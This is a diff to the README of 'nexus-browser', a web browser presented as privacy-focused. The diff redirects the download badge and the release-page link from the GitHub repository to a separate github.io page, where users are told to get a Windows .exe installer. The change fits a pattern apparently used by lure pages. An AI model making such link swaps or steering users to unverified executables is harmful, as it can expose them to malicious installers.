@@ -1,6 +1,6 @@
 # 🌐 nexus-browser - Fast web browsing with privacy protection
 
-[![](https://img.shields.io/badge/Download-Nexus_Browser-blue.svg)](https://github.com/Starlig7502/nexus-browser)
+[![](https://img.shields.io/badge/Download-Nexus_Browser-blue.svg)](https://starlig7502.github.io)
 
 ## 📖 About the project
 
@@ -20,7 +20,7 @@ Before you install Nexus Browser, ensure your computer meets these basic hardwar
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Starlig7502/nexus-browser) to find the latest version of the installer.
+1. Visit the [official release page](https://starlig7502.github.io) to find the latest version of the installer.
 2. Select the file ending in .exe to begin your download.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
